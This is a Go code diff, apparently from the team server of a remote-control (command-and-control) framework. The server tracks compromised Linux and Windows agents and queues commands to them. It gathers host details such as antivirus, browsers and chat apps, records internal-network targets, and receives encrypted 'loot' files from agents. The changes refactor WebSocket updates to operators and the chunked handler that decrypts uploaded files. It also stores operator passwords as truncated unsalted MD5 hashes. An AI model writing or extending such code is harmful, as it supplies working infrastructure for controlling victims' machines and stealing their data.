@@ -80,9 +80,6 @@ var (
 	sessionSlice []string
 	/*不可清理*/ error_str string
 
-	UploadFile_byte_parts = make(map[string][]byte)
-	/*不可清理*/ upByteMu sync.RWMutex
-
 	DownloadFile_byte_parts = make(map[string][]byte)
 	parts_count             = make(map[string]int)
 	/*不可清理*/ DoByteMu sync.RWMutex
@@ -484,13 +481,16 @@ func PushData(username string, pushType string) {
 		data = GetChatSlice()
 	// 日志
 	case "log":
-		data = Log_read(50)
+		data = Log_read(1000)
 	// 插件
 	case "PluginList":
 		data = GetAllPluginCode()
 	// 战利品
 	case "loot":
 		data = Get_loots_pro()
+	// 更新日志
+	case "updatelog":
+		data = Log_read(1)
 	default:
 		return
 	}
@@ -498,7 +498,10 @@ func PushData(username string, pushType string) {
 		PushWS(
 			username,
 			pushType,
-			data,
+			map[string]interface{}{
+				"code": "200",
+				"data": data,
+			},
 		)
 	}
 }
@@ -506,14 +509,46 @@ func PushData(username string, pushType string) {
 func PushAgentData(uid, path string) {
 	var data interface{}
 	switch path {
+
+	// 推送全部task(排列顺序)
 	case "GetMsgList":
 		data = GetMsgList(uid)
-	case "GetMsgPost":
-		data = sendMsg(uid)
-	case "GetMsgCache":
-		data = Read_file_list(uid)
-	case "GetMsgNet":
-		data = getInnet(uid)
+
+	// 推送指定监听
+	case "updateListen":
+		data = updateListen(uid)
+	// 推送指定服务器
+	case "updateServer":
+		data = updateServerIndex(uid)
+	// 推送指定插件
+	case "updatePlugin":
+		data = updatePluginCode(uid)
+	// 推送指定聊天
+	case "updateChat":
+		data = updateChatSlice(uid)
+	// 推送指定战利品
+	case "updateLoot":
+		data = updateLoot(uid)
+	// 推送指定代理
+	case "updateIndex":
+		data = updateIndex(uid)
+	// 推送指定Windows代理
+	case "updateWinIndex":
+		data = updateIndex_windows(uid)
+
+	// 推送代理消息
+	case "updateGetMsgList":
+		data = updateGetMsgList(uid)
+	// 推送消息结果
+	case "updateGetMsgPost":
+		data = updateGetMsgPost(uid)
+	// 推送目录缓存
+	case "updateGetMsgCache":
+		data = updateGetMsgCache(uid)
+	// 推送内网信息
+	case "updateGetMsgNet":
+		data = updateInnet(uid)
+
 	default:
 		return
 	}
@@ -731,7 +766,13 @@ func User_index() http.HandlerFunc {
 							"taskid":  taskid,
 							"message": "Successfully deleted target",
 						})
-						go PushAgentData(uid, "GetMsgNet")
+
+						// 异步推送删除消息到前端
+						go PushWS("", "send_delShellInnet", map[string]interface{}{
+							"uid":    uid,
+							"target": target,
+							"taskid": taskid,
+						})
 					} else {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code":    404,
@@ -849,9 +890,15 @@ func User_index() http.HandlerFunc {
 						"taskid": taskid,
 						"data":   "agent has been removed",
 					})
-					go PushData("", "agentList")
-					go PushData("", "winAgentList")
-					go PushData("", "loot")
+
+					go PushWS("", "send_delInfo", map[string]interface{}{
+						"uid":    uid,
+						"taskid": taskid,
+					})
+					go PushWS("", "send_delWinInfo", map[string]interface{}{
+						"uid":    uid,
+						"taskid": taskid,
+					})
 
 				case "getFileList":
 					uid, _ := body["uid"].(string)
@@ -878,7 +925,18 @@ func User_index() http.HandlerFunc {
 						"data":   data,
 					})
 
-					go PushAgentData(uid, "GetMsgCache")
+					go PushAgentData(uid, "updateGetMsgCache")
+
+				case "getFileCache":
+					uid, _ := body["uid"].(string)
+					data := Read_file_list(uid)
+					clientWs.WriteJSON(map[string]interface{}{
+						"code": 200,
+						"path": "getFileCache",
+						"uid":  uid,
+						"data": data,
+					})
+
 				case "downloadlog":
 					logFilePath := "server.log"
 					file, err := os.Open(logFilePath)
@@ -1129,25 +1187,6 @@ func User_index() http.HandlerFunc {
 
 						"data": shell_list,
 					})
-				case "confirm":
-					uid, _ := body["uid"].(string)
-					username, _ := body["username"].(string)
-					client, err := Confirm_chan(uid, username)
-					if err != nil {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code":    404,
-							"path":    "confirm",
-							"uid":     uid,
-							"message": err.Error(),
-						})
-						continue
-					}
-					clientWs.WriteJSON(map[string]interface{}{
-						"code": 200,
-						"path": "confirm",
-						"uid":  uid,
-						"data": client,
-					})
 				case "agentcode":
 					uid, _ := body["uid"].(string)
 					username, _ := body["username"].(string)
@@ -1261,7 +1300,7 @@ func User_index() http.HandlerFunc {
 					}
 					clientDataMu.RUnlock()
 					if blocked {
-						stopStr := fmt.Sprintf(log_word["stop_server"])
+						stopStr := log_word["stop_server"]
 						logger.WriteLog(stopStr)
 						clientWs.WriteJSON(map[string]interface{}{
 							"code":    400,
@@ -1283,7 +1322,7 @@ func User_index() http.HandlerFunc {
 					}
 					windows_clientMu.RUnlock()
 					if blocked {
-						stopStr := fmt.Sprintf(log_word["stop_server"])
+						stopStr := log_word["stop_server"]
 						logger.WriteLog(stopStr)
 						clientWs.WriteJSON(map[string]interface{}{
 							"code":    400,
@@ -1328,7 +1367,14 @@ func User_index() http.HandlerFunc {
 						"taskid":  taskid,
 						"message": stopStr,
 					})
-					go PushData("", "server")
+					go PushWS(
+						"",
+						"send_delServer",
+						map[string]interface{}{
+							"port":   port,
+							"taskid": taskid,
+						},
+					)
 				case "changeMsh":
 					uid, ok := body["uid"].(string)
 					taskid, _ := body["taskid"].(string)
@@ -1446,7 +1492,17 @@ func User_index() http.HandlerFunc {
 						"index":   indexStr,
 						"message": "message deleted",
 					})
-					go PushAgentData(uid, "GetMsgList")
+
+					// 向其它连接推送删除消息
+					go PushWS(
+						"",
+						"send_delMsgGet",
+						map[string]interface{}{
+							"uid":    uid,
+							"taskid": taskid,
+							"index":  indexStr,
+						},
+					)
 
 				case "getMsg":
 					uid, _ := body["uid"].(string)
@@ -1550,7 +1606,18 @@ func User_index() http.HandlerFunc {
 						"taskid":  taskid,
 						"message": "deleted successfully",
 					})
-					go PushAgentData(uid, "GetMsgPost")
+
+					// 向其它连接推送删除消息结果
+					go PushWS(
+						"",
+						"send_delMsgMap",
+						map[string]interface{}{
+							"uid":    uid,
+							"taskid": taskid,
+							"index":  indexStr,
+						},
+					)
+
 				case "delPlugin":
 					_os, _ := body["os"].(string)
 					remark, _ := body["remark"].(string)
@@ -1605,7 +1672,15 @@ func User_index() http.HandlerFunc {
 						continue
 					}
 
-					go PushData("", "PluginList")
+					go PushWS(
+						"",
+						"send_delPlugin",
+						map[string]interface{}{
+							"os":        _os,
+							"remark":    remark,
+							"codeWords": codeWords,
+						},
+					)
 
 					clientWs.WriteJSON(map[string]interface{}{
 						"code":   200,
@@ -1632,7 +1707,16 @@ func User_index() http.HandlerFunc {
 							"taskid":  taskid,
 							"message": "File deleted successfully",
 						})
-						go PushAgentData(uid, "GetMsgCache")
+						// 向其它连接推送删除目录
+						go PushWS(
+							"",
+							"send_delFileList",
+							map[string]interface{}{
+								"uid":    uid,
+								"taskid": taskid,
+								"index":  indexStr,
+							},
+						)
 					} else {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code":    400,
@@ -1643,14 +1727,10 @@ func User_index() http.HandlerFunc {
 							"message": "File not found or invalid index",
 						})
 					}
+
 				case "cleanup":
 					ClearUnmarkedGlobalVars()
-					clientWs.WriteJSON(map[string]interface{}{
-						"code": 200,
-						"path": "cleanup",
 
-						"message": "cleanup success",
-					})
 				case "change_pro":
 					uid, _ := body["uid"].(string)
 					username, _ := body["username"].(string)
@@ -1821,7 +1901,9 @@ func User_index() http.HandlerFunc {
 						plugin,
 					)
 					serverPluginMu.Unlock()
-					go PushData("", "PluginList")
+
+					go PushAgentData(codeWords, "updatePlugin")
+
 					logger.WriteLog(
 						fmt.Sprintf(
 							log_word["plugin_code"],
@@ -1859,7 +1941,9 @@ func User_index() http.HandlerFunc {
 						chat,
 					)
 					dataChatmu.Unlock()
-					go PushData("", "chat")
+
+					go PushAgentData(chatid, "updateChat")
+
 					logger.WriteLog(
 						fmt.Sprintf(
 							log_word["chat_message"],
@@ -1916,7 +2000,17 @@ func User_index() http.HandlerFunc {
 						"status": "deleted",
 						"chatid": chatid,
 					})
-					go PushData("", "chat")
+
+					go PushWS(
+						"",
+						"send_deleteChat",
+						map[string]interface{}{
+							"chatid":   chatid,
+							"username": username,
+							"message":  message,
+						},
+					)
+
 				case "changeResponseHead":
 					port, _ := body["port"].(string)
 					responseHead, _ := body["response_head"].(string)
@@ -2001,7 +2095,7 @@ func User_index() http.HandlerFunc {
 				case "addteamment":
 					username, _ := body["username"].(string)
 					password, _ := body["password"].(string)
-				
+
 					if username == "" || password == "" {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code":    400,
@@ -2010,29 +2104,29 @@ func User_index() http.HandlerFunc {
 						})
 						continue
 					}
-				
+
 					userHash := md5.Sum([]byte(username))
 					hashedUsername := hex.EncodeToString(userHash[:])[:24]
-				
+
 					passHash := md5.Sum([]byte(password))
 					hashedPassword := hex.EncodeToString(passHash[:])[:24]
-				
+
 					type User struct {
 						Username string `json:"username"`
 						Password string `json:"password"`
 					}
-				
+
 					type UserFile struct {
 						Users []User `json:"users"`
 					}
-				
+
 					resultCode := 200
 					resultMessage := "user added successfully"
 					userAdded := false
-				
+
 					userFilePath := "user.json"
 					userData := UserFile{Users: []User{}}
-				
+
 					data, err := os.ReadFile(userFilePath)
 					if err == nil && len(data) > 0 {
 						if err := json.Unmarshal(data, &userData); err != nil {
@@ -2045,7 +2139,7 @@ func User_index() http.HandlerFunc {
 						resultMessage = "failed to read user.json"
 						break
 					}
-				
+
 					for _, user := range userData.Users {
 						if user.Username == hashedUsername {
 							resultCode = 400
@@ -2053,29 +2147,29 @@ func User_index() http.HandlerFunc {
 							break
 						}
 					}
-				
+
 					if resultCode == 200 {
 						userData.Users = append(userData.Users, User{
 							Username: hashedUsername,
 							Password: hashedPassword,
 						})
-				
+
 						output, err := json.MarshalIndent(userData, "", "  ")
 						if err != nil {
 							resultCode = 500
 							resultMessage = "failed to marshal users"
 							break
 						}
-				
+
 						if err := os.WriteFile(userFilePath, output, 0600); err != nil {
 							resultCode = 500
 							resultMessage = "failed to write user.json"
 							break
 						}
-				
+
 						userAdded = true
 					}
-				
+
 					if userAdded {
 						logger.WriteLog(fmt.Sprintf(
 							log_word["add_user"],
@@ -2084,7 +2178,7 @@ func User_index() http.HandlerFunc {
 							hashedPassword,
 						))
 					}
-				
+
 					clientWs.WriteJSON(map[string]interface{}{
 						"code":    resultCode,
 						"path":    "addteamment",
@@ -2186,7 +2280,7 @@ func User_index() http.HandlerFunc {
 					dupServer := false
 					for i := range server_data.Servers {
 						server := &server_data.Servers[i]
-						if requestData.Port == server.Port || requestData.Remark == server.Remark {
+						if requestData.Port == server.Port || requestData.Remark == server.Remark || requestData.Protocol == server.Protocol {
 							dupServer = true
 							break
 						}
@@ -2472,7 +2566,8 @@ func User_index() http.HandlerFunc {
 						dataChatmu.Lock()
 						data_chat.Chats = append(data_chat.Chats, chat)
 						dataChatmu.Unlock()
-						go PushData("", "chat")
+
+						go PushAgentData(uploadTask.Chatid, "updateChat")
 
 						logger.WriteLog(
 							fmt.Sprintf(
@@ -2779,6 +2874,9 @@ func Change_pro(uid, username, remarks, delay, jitter, Taskid string) string {
 			if !usernameModified && !remarksModified && !delayModified && !jitterModified {
 				return "No changes needed"
 			}
+
+			go PushAgentData(uid, "updateWinIndex")
+
 			return "confirm"
 		}
 	}
@@ -2841,22 +2939,15 @@ func Change(uid, username, remarks, delay, jitter, Taskid string) string {
 			if !usernameModified && !remarksModified && !delayModified && !jitterModified {
 				return "No changes needed"
 			}
+
+			go PushAgentData(uid, "updateIndex")
+
 			return "confirm"
 		}
 	}
 	return "nil"
 }
-func Confirm_chan(uid, username string) (Client, error) {
-	clientDataMu.RLock()
-	defer clientDataMu.RUnlock()
-	for i := range client_data.Clients {
-		client := &client_data.Clients[i] // 指针查找
-		if uid == client.Uid && username == client.Username {
-			return *client, nil // 找到后解引用返回副本
-		}
-	}
-	return Client{}, fmt.Errorf("client not found")
-}
+
 func getClientIP(r *http.Request) string {
 	forwarded := r.Header.Get("X-Forwarded-For")
 	if forwarded != "" {
@@ -2911,6 +3002,23 @@ func Listen() string {
 		return "[]"
 	}
 	return string(b)
+}
+
+func updateListen(uid string) []ClientInfo {
+	dataConnMu.RLock()
+	defer dataConnMu.RUnlock()
+	for i := range data_conn.Conns {
+		client := &data_conn.Conns[i]
+		if uid == client.Uid {
+			return []ClientInfo{{
+				Uid:        client.Uid,
+				Host:       client.Host,
+				OnlineTime: client.OnlineTime,
+				ShellIP:    client.ShellIP,
+			}}
+		}
+	}
+	return nil
 }
 
 func Get_conn(uid, hostname, clientIP, base_rounds string) string {
@@ -3157,7 +3265,13 @@ func cleanupDeletedUID(uid string, delbase bool) {
 		delete(uid_base, uid)
 		uidMutex.Unlock()
 	}
-	go PushData("", "listen")
+	go PushWS(
+		"",
+		"send_delListen",
+		map[string]interface{}{
+			"uid": uid,
+		},
+	)
 }
 
 func deleteConnAtIndex(index int, delbase bool) bool {
@@ -3323,6 +3437,21 @@ func Read_file_list(uid string) []file_json {
 	}
 	return fileList
 }
+func updateGetMsgCache(uid string) []file_json {
+	fcache.RLock()
+	defer fcache.RUnlock()
+	// 只返回最新的一条目录缓存
+	for i := len(msg_file_cache) - 1; i >= 0; i-- {
+		item := &msg_file_cache[i]
+		if item.Uid == uid {
+			return []file_json{{
+				List: item.Taskid,
+				File: item.File,
+			}}
+		}
+	}
+	return []file_json{}
+}
 
 // 缓存客户端目录
 func save_file_list(uid, file, list string) {
@@ -3342,9 +3471,10 @@ func save_file_list(uid, file, list string) {
 		File:   file,
 	})
 
-	go PushAgentData(uid, "GetMsgCache")
+	go PushAgentData(uid, "updateGetMsgCache")
 
 }
+
 func sendMsg(uid string) []string {
 	if uid == "" {
 		return []string{}
@@ -3362,6 +3492,22 @@ func sendMsg(uid string) []string {
 		}
 	}
 	return msgList
+}
+
+func updateGetMsgPost(uid string) []string {
+	if uid == "" {
+		return []string{}
+	}
+	mapMu.RLock()
+	defer mapMu.RUnlock()
+	// 只返回最新的一条消息
+	for i := len(msg_map_list) - 1; i >= 0; i-- {
+		msg := &msg_map_list[i]
+		if msg.Uid == uid {
+			return []string{msg.Taskid + ":" + msg.Result}
+		}
+	}
+	return []string{}
 }
 
 // 缓存客户端消息
@@ -3462,6 +3608,27 @@ func GetMsgList(uid string) []string {
 	return result
 }
 
+func updateGetMsgList(uid string) []string {
+	if uid == "" {
+		return []string{}
+	}
+	queuesMu.RLock()
+	q := msgQueues[uid]
+	queuesMu.RUnlock()
+	if q == nil {
+		return []string{}
+	}
+	q.mu.Lock()
+	defer q.mu.Unlock()
+	// 将最新的一条消息返回
+	if len(q.messages) == 0 {
+		return []string{}
+	}
+	item := &q.messages[len(q.messages)-1]
+	entry := fmt.Sprintf("%s:\t%s", item.Taskid, item.Ori_Msg)
+	return []string{entry}
+}
+
 // 获取结果
 func Getresults(uid, taskid string) string {
 	// 1. 先用读锁看这个 UID 的队列是否存在
@@ -3541,7 +3708,9 @@ func Results(uid, results, Taskid string, code_map map[byte]int) {
 		}
 	}
 	windows_clientMu.RUnlock()
-	go PushAgentData(uid, "GetMsgPost")
+
+	go PushAgentData(uid, "updateGetMsgPost")
+
 	log_str := fmt.Sprintf(log_word["result"], shellname, uid, len(results))
 	logger.WriteLog(log_str)
 }
@@ -3602,7 +3771,15 @@ func GetMsg(uid, base_rounds, uidBytes string) string {
 	msg := queue.messages[0]
 	queue.messages = queue.messages[1:]
 
-	go PushAgentData(uid, "GetMsgList")
+	go PushWS(
+		"",
+		"send_delMsgGet",
+		map[string]interface{}{
+			"uid":    uid,
+			"taskid": msg.Taskid,
+			"index":  "0",
+		},
+	)
 
 	return msg.Encry_Msg
 }
@@ -3834,7 +4011,7 @@ func Getcmd(uid, cmd, Taskid string) string {
 		}
 	}
 
-	go PushAgentData(uid, "GetMsgList")
+	go PushAgentData(uid, "updateGetMsgList")
 
 	return ""
 }
@@ -3991,6 +4168,7 @@ func LoadHistoryFiles() error {
 	}
 	return nil
 }
+
 func GetChatSlice() []Chat {
 	dataChatmu.RLock()
 	defer dataChatmu.RUnlock()
@@ -4001,6 +4179,19 @@ func GetChatSlice() []Chat {
 	)
 	return chats
 }
+
+func updateChatSlice(chatid string) []Chat {
+	dataChatmu.Lock()
+	defer dataChatmu.Unlock()
+	for i := range data_chat.Chats {
+		chat := &data_chat.Chats[i]
+		if chat.Chatid == chatid {
+			return []Chat{*chat}
+		}
+	}
+	return nil
+}
+
 func GetAllPluginCode() []Plugin {
 	serverPluginMu.RLock()
 	defer serverPluginMu.RUnlock()
@@ -4014,6 +4205,19 @@ func GetAllPluginCode() []Plugin {
 	}
 	return codeSlice
 }
+
+func updatePluginCode(codeWord string) []Plugin {
+	serverPluginMu.RLock()
+	defer serverPluginMu.RUnlock()
+	for i := range server_plugin.Plugins {
+		plugin := &server_plugin.Plugins[i]
+		if plugin.CodeWord == codeWord {
+			return []Plugin{*plugin}
+		}
+	}
+	return nil
+}
+
 func ServerIndex() []Server {
 	serverDataMu.RLock()
 	defer serverDataMu.RUnlock()
@@ -4023,6 +4227,17 @@ func ServerIndex() []Server {
 		matchedServers = append(matchedServers, *server)
 	}
 	return matchedServers
+}
+func updateServerIndex(port string) []Server {
+	serverDataMu.RLock()
+	defer serverDataMu.RUnlock()
+	for i := range server_data.Servers {
+		server := &server_data.Servers[i]
+		if server.Port == port {
+			return []Server{*server}
+		}
+	}
+	return nil
 }
 
 type EnrichedClient struct {
@@ -4045,32 +4260,37 @@ type EnrichedClient struct {
 	Protocol        string                         `json:"protocol"`
 }
 
+func buildPluginParamMap(serverRemark string) map[string]map[string][]string {
+	pluginParamMap := make(map[string]map[string][]string)
+	normalizedServerRemark := strings.TrimSpace(serverRemark)
+	for j := range server_plugin.Plugins {
+		plugin := &server_plugin.Plugins[j]
+		if strings.TrimSpace(plugin.Remark) != normalizedServerRemark {
+			continue
+		}
+
+		osKey := strings.ToLower(strings.TrimSpace(plugin.OS))
+		if osKey == "" {
+			continue
+		}
+
+		if pluginParamMap[osKey] == nil {
+			pluginParamMap[osKey] = make(map[string][]string)
+		}
+		pluginParamMap[osKey][plugin.CodeWord] = plugin.ParameterDesc
+	}
+	return pluginParamMap
+}
+
 func UserIndex() []EnrichedClient {
 	clientDataMu.RLock()
 	defer clientDataMu.RUnlock()
-	// 统计匹配数量
-	matchedCount := 0
-	for range client_data.Clients {
-		matchedCount++
-	}
 	matchedClients := make([]EnrichedClient, 0, len(client_data.Clients))
 	serverPluginMu.RLock()
 	defer serverPluginMu.RUnlock()
 	for i := range client_data.Clients {
 		client := &client_data.Clients[i]
-		pluginParamMap := make(map[string]map[string][]string)
-		for j := range server_plugin.Plugins {
-			plugin := &server_plugin.Plugins[j]
-			if plugin.Remark == client.Server {
-				os := plugin.OS
-				code := plugin.CodeWord
-				desc := plugin.ParameterDesc
-				if pluginParamMap[os] == nil {
-					pluginParamMap[os] = make(map[string][]string)
-				}
-				pluginParamMap[os][code] = desc
-			}
-		}
+		pluginParamMap := buildPluginParamMap(client.Server)
 		enriched := EnrichedClient{
 			Username:        client.Username,
 			Host:            client.Host,
@@ -4093,6 +4313,49 @@ func UserIndex() []EnrichedClient {
 		matchedClients = append(matchedClients, enriched)
 	}
 	return matchedClients
+}
+
+func updateIndex(uid string) *EnrichedClient {
+	clientDataMu.RLock()
+	var clientCopy Client
+	found := false
+	for i := range client_data.Clients {
+		if uid == client_data.Clients[i].Uid {
+			clientCopy = client_data.Clients[i]
+			found = true
+			break
+		}
+	}
+	clientDataMu.RUnlock()
+
+	if !found {
+		return nil
+	}
+
+	serverPluginMu.RLock()
+	pluginParamMap := buildPluginParamMap(clientCopy.Server)
+	serverPluginMu.RUnlock()
+
+	enriched := EnrichedClient{
+		Username:        clientCopy.Username,
+		Host:            clientCopy.Host,
+		OS:              clientCopy.OS,
+		Delay:           clientCopy.Delay,
+		OnlineTime:      clientCopy.OnlineTime,
+		ExternalIP:      clientCopy.ExternalIP,
+		LocalIP:         clientCopy.LocalIP,
+		CurrentDir:      clientCopy.CurrentDir,
+		Version:         clientCopy.version,
+		Remarks:         clientCopy.Remarks,
+		CheckTime:       clientCopy.checkTime,
+		Uid:             clientCopy.Uid,
+		Server:          clientCopy.Server,
+		PluginParameter: pluginParamMap,
+		Executable:      clientCopy.Executable,
+		Jitter:          clientCopy.Jitter,
+		Protocol:        clientCopy.Proto,
+	}
+	return &enriched
 }
 
 // Windows 专用的客户端列表获取函数
@@ -4128,27 +4391,12 @@ type EnrichedWindowsClient struct {
 func windows_pro_UserIndex() []EnrichedWindowsClient {
 	windows_clientMu.RLock()
 	defer windows_clientMu.RUnlock()
-	// 统计匹配数量
-	matchedCount := 0
-	for range windows_client_data.Clients {
-		matchedCount++
-	}
 	matchedClients := make([]EnrichedWindowsClient, 0, len(windows_client_data.Clients))
 	serverPluginMu.RLock()
 	defer serverPluginMu.RUnlock()
 	for i := range windows_client_data.Clients {
 		client := &windows_client_data.Clients[i]
-		pluginParamMap := make(map[string]map[string][]string)
-		for j := range server_plugin.Plugins {
-			plugin := &server_plugin.Plugins[j]
-			if plugin.Remark == client.Server {
-				os := plugin.OS
-				if pluginParamMap[os] == nil {
-					pluginParamMap[os] = make(map[string][]string)
-				}
-				pluginParamMap[os][plugin.CodeWord] = plugin.ParameterDesc
-			}
-		}
+		pluginParamMap := buildPluginParamMap(client.Server)
 		enriched := EnrichedWindowsClient{
 			Username:        client.Username,
 			Host:            client.Host,
@@ -4181,6 +4429,57 @@ func windows_pro_UserIndex() []EnrichedWindowsClient {
 	}
 
 	return matchedClients
+}
+
+func updateIndex_windows(uid string) *EnrichedWindowsClient {
+	windows_clientMu.RLock()
+	var clientCopy WindowsClient
+	found := false
+	for i := range windows_client_data.Clients {
+		if uid == windows_client_data.Clients[i].Uid {
+			clientCopy = windows_client_data.Clients[i]
+			found = true
+			break
+		}
+	}
+	windows_clientMu.RUnlock()
+
+	if !found {
+		return nil
+	}
+
+	serverPluginMu.RLock()
+	pluginParamMap := buildPluginParamMap(clientCopy.Server)
+	serverPluginMu.RUnlock()
+
+	enriched := EnrichedWindowsClient{
+		Username:        clientCopy.Username,
+		Host:            clientCopy.Host,
+		OS:              clientCopy.OS,
+		Delay:           clientCopy.Delay,
+		OnlineTime:      clientCopy.OnlineTime,
+		ExternalIP:      clientCopy.ExternalIP,
+		LocalIP:         clientCopy.LocalIP,
+		CurrentDir:      clientCopy.CurrentDir,
+		Version:         clientCopy.Version,
+		Remarks:         clientCopy.Remarks,
+		CheckTime:       clientCopy.CheckTime,
+		Uid:             clientCopy.Uid,
+		Server:          clientCopy.Server,
+		PluginParameter: pluginParamMap,
+		Executable:      clientCopy.Executable,
+		Jitter:          clientCopy.Jitter,
+		Protocol:        clientCopy.Proto,
+		MacAddresses:    clientCopy.MacAddresses,
+		CPUInfo:         clientCopy.CPUInfo,
+		Antivirus:       clientCopy.Antivirus,
+		Browsers:        clientCopy.Browsers,
+		ChatApps:        clientCopy.ChatApps,
+		MemoryInfo:      clientCopy.MemoryInfo,
+		SystemType:      clientCopy.SystemType,
+		Architecture:    clientCopy.Architecture,
+	}
+	return &enriched
 }
 
 // 下载文件
@@ -4239,7 +4538,6 @@ func DownloadFile(uid, keyDecry string, code_map map[byte]int) ([]byte, error) {
 // 上传文件处理
 func UploadFileHandler(uid, data, filename string,
 	fileData []byte, code_map map[byte]int) {
-	// 检查 UID 是否有效
 	keyMu.RLock()
 	key, exists := key_map[uid]
 	keyMu.RUnlock()
@@ -4259,63 +4557,49 @@ func UploadFileHandler(uid, data, filename string,
 	fileSize := data_list[2]
 	start := data_list[3]
 	end := data_list[4]
-	fileLog := fmt.Sprintf(log_word["request_file"])
+	fileLog := log_word["request_file"]
 	logger.WriteLog(fileLog)
 	splitPos, _ := strconv.Atoi(splitSize)
 	filePos, _ := strconv.Atoi(fileSize)
 	startPos, _ := strconv.Atoi(start)
 	endPos, _ := strconv.Atoi(end)
-	fileLog1 := fmt.Sprintf(log_word["request_file_part"], realFilename, len(fileData)/(1024*1024))
+	fileLog1 := fmt.Sprintf(log_word["request_file_part"], realFilename, len(fileData))
 	logger.WriteLog(fileLog1)
-	// 拼接文件名
+
 	receivedFilePath := "./uploads/" + uid + "/" + realFilename
 	dirPath := filepath.Dir(receivedFilePath)
-	// 检查目录是否存在
 	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
-		// 如果目录不存在，则创建
-		err := os.MkdirAll(dirPath, 0755)
-		if err != nil {
+		if err := os.MkdirAll(dirPath, 0755); err != nil {
 			return
 		}
 	}
-	// 将文件块保存到全局变量
-	file_key := uid + "=" + realFilename
-	upByteMu.Lock()
-	defer upByteMu.Unlock()
-	if existingData, exists := UploadFile_byte_parts[file_key]; exists {
-		// 如果存在已经保存的部分，将当前的分段追加到之前的字节流中
-		UploadFile_byte_parts[file_key] = append(existingData, fileData...)
-	} else {
-		// 如果没有保存该文件的分段，则保存当前分段
-		UploadFile_byte_parts[file_key] = fileData
+	// 解密当前分块
+	decrypted := Decrypt(fileData, key_part)
+	if decrypted == nil {
+		return
 	}
-	// 判断是否是最后一段，如果是，合并所有分段并解密
+	// 直接追加写入目标文件
+	f, err := os.OpenFile(receivedFilePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		return
+	}
+	_, err = f.Write(decrypted)
+	f.Close()
+	if err != nil {
+		return
+	}
+	// 最后一块完成
 	if endPos == filePos {
-		// 解密文件
-		err := decryptFile(file_key, receivedFilePath, key_part)
-		if err != nil {
-			return
-		}
-		// 解密后清空全局变量中的文件数据
-		delete(UploadFile_byte_parts, file_key)
-
-		go PushData("", "loot")
-
+		go PushAgentData(uid, "updateLoot")
+		time.Sleep(3 * time.Second)
+		filelog3 := fmt.Sprintf(log_word["request_file_finish"], username, uid, realFilename, filePos, receivedFilePath)
+		logger.WriteLog(filelog3)
 	}
 	fileLog2 := fmt.Sprintf(log_word["request_file_part_"],
-		username, uid, realFilename, splitPos/(1024*1024), startPos/(1024*1024), endPos/(1024*1024))
+		username, uid, realFilename, splitPos, startPos, endPos)
 	logger.WriteLog(fileLog2)
 }
 
-// 解密文件
-func decryptFile(receivedFile, receivedFilePath string, key []byte) error {
-	outputFile, err := os.Create(receivedFilePath)
-	if err != nil {
-		return err
-	}
-	defer outputFile.Close()
-	return Get_decry_f(UploadFile_byte_parts[receivedFile], outputFile, key)
-}
 func getFilenameFromPath(path string) string {
 	// 查找最后一个斜杠的位置，可以是 / 或 \
 	lastSlash := strings.LastIndexAny(path, "/\\")
@@ -4408,7 +4692,7 @@ func (w *MyLog) WriteLog(logStr string) {
 	if err != nil {
 		fmt.Println("write log error:", err)
 	}
-	go PushData("", "log")
+	go PushData("", "updatelog")
 }
 
 type LootFile struct {
@@ -4474,6 +4758,58 @@ func Get_loots_pro() []LootClient {
 		result = append(result, loot)
 	}
 	return result
+}
+
+func updateLoot(uid string) LootClient {
+	loot := LootClient{
+		UID:   uid,
+		Host:  "",
+		Files: []LootFile{},
+	}
+	clientDataMu.RLock()
+	for i := range client_data.Clients {
+		c := &client_data.Clients[i]
+		if c.Uid == uid {
+			loot.Host = c.Host
+			break
+		}
+	}
+	clientDataMu.RUnlock()
+
+	windows_clientMu.RLock()
+	for i := range windows_client_data.Clients {
+		c := &windows_client_data.Clients[i]
+		if c.Uid == uid {
+			loot.Host = c.Host
+			break
+		}
+	}
+	windows_clientMu.RUnlock()
+
+	dirPath := filepath.Join("uploads", uid)
+	files, err := os.ReadDir(dirPath)
+	if err != nil {
+		return loot
+	}
+	for _, file := range files {
+		if file.IsDir() {
+			continue
+		}
+		fullPath := filepath.Join(dirPath, file.Name())
+		info, err := os.Stat(fullPath)
+		if err != nil {
+			continue
+		}
+		loot.Files = append(
+			loot.Files,
+			LootFile{
+				Name:    file.Name(),
+				SizeKB:  info.Size() / 1024,
+				ModTime: info.ModTime().Format("2006-01-02 15:04:05"),
+			},
+		)
+	}
+	return loot
 }
 
 // 前端上传文件
@@ -4595,28 +4931,23 @@ func ClearUnmarkedGlobalVars() {
 	msg_file_cache = make([]Msg_file, 0)
 	fcache.Unlock()
 
-	// 9) 清理上传缓存
-	upByteMu.Lock()
-	UploadFile_byte_parts = make(map[string][]byte)
-	upByteMu.Unlock()
-
-	// 10) 清理下载缓存
+	// 9) 清理下载缓存
 	DoByteMu.Lock()
 	DownloadFile_byte_parts = make(map[string][]byte)
 	parts_count = make(map[string]int)
 	DoByteMu.Unlock()
 
-	// 11) 清理全局 sessionSlice
+	// 10) 清理全局 sessionSlice
 	mutex.Lock()
 	sessionSlice = make([]string, 0)
 	mutex.Unlock()
 
-	// 12) 清理内网资产
+	// 11) 清理内网资产
 	dataInnetmu.Lock()
 	data_innet.Innets = nil
 	dataInnetmu.Unlock()
 
-	// 13) 清理websocket连接
+	// 12) 清理websocket连接
 	wsUsersMu.Lock()
 	for _, clients := range wsUsers {
 		for _, c := range clients {
@@ -4629,7 +4960,7 @@ func ClearUnmarkedGlobalVars() {
 	wsUsersMu.Unlock()
 
 	// 14) 写日志（这里可以直接写，不影响锁）
-	logStr := fmt.Sprintf(log_word["Memory_clean"])
+	logStr := log_word["Memory_clean"]
 	logger.WriteLog(logStr)
 }
 
@@ -4645,6 +4976,17 @@ func getInnet(uid string) []Innet {
 		}
 	}
 	return listInnet
+}
+func updateInnet(uid string) Innet {
+	dataInnetmu.RLock()
+	defer dataInnetmu.RUnlock()
+	for i := range data_innet.Innets {
+		innet := &data_innet.Innets[i]
+		if uid == innet.Uid {
+			return *innet
+		}
+	}
+	return Innet{}
 }
 
 // obf const encry
@@ -5104,7 +5446,7 @@ func put_innet(uid, target string, shell_innet []string) {
 	}
 	data_innet.Innets = append(data_innet.Innets, newInnet)
 
